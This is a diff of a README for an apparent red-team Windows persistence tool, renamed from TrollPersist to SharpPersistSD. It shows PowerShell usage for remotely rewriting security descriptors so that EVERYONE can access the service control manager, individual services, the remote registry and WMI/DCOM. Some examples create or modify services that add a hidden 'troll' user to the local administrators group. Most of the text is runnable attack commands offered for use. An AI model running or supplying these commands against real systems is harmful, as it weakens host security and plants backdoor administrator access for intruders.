@@ -66,42 +66,42 @@ means it uses the RemoteRegistry protocol to modify registry permissions..
 ## SCM SD, allow everyone  - Requires Reboot for services.exe to restart!!
 ```
 #Modify SD to allow "EVERYONE" access to service control manager
-[TrollPersist.SecurityDescriptor]::REG_ModifyRegistryContainingSD("SCM","Hostname","(A;;KA;;;WD)","SYSTEM\CurrentControlSet\Control\ServiceGroupOrder\Security", "Security")
+[SharpPersistSD.SecurityDescriptor]::REG_ModifyRegistryContainingSD("SCM","Hostname","(A;;KA;;;WD)","SYSTEM\CurrentControlSet\Control\ServiceGroupOrder\Security", "Security")
 
 #Set exemption for non-admin to access services. This sets for all services, you can use REG_CreateRegKey to set for specific service.
-[TrollPersist.SecurityDescriptor]::REG_CreateRegKey("Hostname", "SYSTEM\CurrentControlSet\Control", "RemoteAccessExemption", 1, 4)
+[SharpPersistSD.SecurityDescriptor]::REG_CreateRegKey("Hostname", "SYSTEM\CurrentControlSet\Control", "RemoteAccessExemption", 1, 4)
 
 #After reboot - You must use the provided SCM_CreateAndStart() function. sc.exe will not work to start the service.
 #Create and start service
-[TrollPersist.SecurityDescriptor]::SCM_CreateAndStart("Hostname","troll","cmd /c net users /add troll Trolololol123 && net localgroup administrators /add troll")
+[SharpPersistSD.SecurityDescriptor]::SCM_CreateAndStart("Hostname","troll","cmd /c net users /add troll Trolololol123 && net localgroup administrators /add troll")
 ```
 ## SVC SD, allow everyone  - Requires Reboot for services.exe to restart!! 
 ```
 #Modify SD to allow "EVERYONE" access to specific service (eg.PlugPlay)
-[TrollPersist.SecurityDescriptor]::REG_ModifyRegistryContainingSD("SVC","Hostname","(A;;KA;;;WD)","SYSTEM\CurrentControlSet\Services\PlugPlay\Security", "Security")
+[SharpPersistSD.SecurityDescriptor]::REG_ModifyRegistryContainingSD("SVC","Hostname","(A;;KA;;;WD)","SYSTEM\CurrentControlSet\Services\PlugPlay\Security", "Security")
 
 #Set exemption for non-admin to access services. This sets for all services, you can use REG_CreateRegKey to set for specific service.
-[TrollPersist.SecurityDescriptor]::REG_CreateRegKey("Hostname", "SYSTEM\CurrentControlSet\Control", "RemoteAccessExemption", 1, 4)
+[SharpPersistSD.SecurityDescriptor]::REG_CreateRegKey("Hostname", "SYSTEM\CurrentControlSet\Control", "RemoteAccessExemption", 1, 4)
 
 #After reboot - You must use the provided SVC_ModifyAndStart() function. sc.exe will not work to start the service.
 #Modify and start service
-[TrollPersist.SecurityDescriptor]::SVC_ModifyAndStart("Hostname", "troll", "cmd /c net users /add troll Trolololol123 && net localgroup administrators /add troll")
+[SharpPersistSD.SecurityDescriptor]::SVC_ModifyAndStart("Hostname", "troll", "cmd /c net users /add troll Trolololol123 && net localgroup administrators /add troll")
 ```
 ## REG SD, allow everyone 
 ```
 #Modify SD to allow "EVERYONE" access to remote registry service
-[TrollPersist.SecurityDescriptor]::REG_ModifyRegistryPermissions("Hostname","SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg","EVERYONE",$false)
+[SharpPersistSD.SecurityDescriptor]::REG_ModifyRegistryPermissions("Hostname","SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg","EVERYONE",$false)
 
 #Modify key to allow write  
-[TrollPersist.SecurityDescriptor]::REG_ModifyRegistryPermissions("Hostname","SYSTEM\CurrentControlSet\Control","EVERYONE",$true)
+[SharpPersistSD.SecurityDescriptor]::REG_ModifyRegistryPermissions("Hostname","SYSTEM\CurrentControlSet\Control","EVERYONE",$true)
 
 #Alternatively, you can set it on "SYSTEM", which lets you create services, scheduled tasks just via registry keys (eg. GhostTask)
 ```
 ## WMI SD, allow everyone 
 ```
 #Modify SD to allow "EVERYONE" access to WMI
-[TrollPersist.SecurityDescriptor]::WMI_ModifyWMISD("Hostname","(A;;CCWP;;;WD)") 
-[TrollPersist.SecurityDescriptor]::REG_ModifyRegistryContainingSD("DCOM","Hostname","(A;;CCDCRP;;;WD)","software\microsoft\ole", "MachineLaunchRestriction")
+[SharpPersistSD.SecurityDescriptor]::WMI_ModifyWMISD("Hostname","(A;;CCWP;;;WD)") 
+[SharpPersistSD.SecurityDescriptor]::REG_ModifyRegistryContainingSD("DCOM","Hostname","(A;;CCDCRP;;;WD)","software\microsoft\ole", "MachineLaunchRestriction")
 
 #Can use any wmi tool to connect (eg. SharpWMI)
 ```
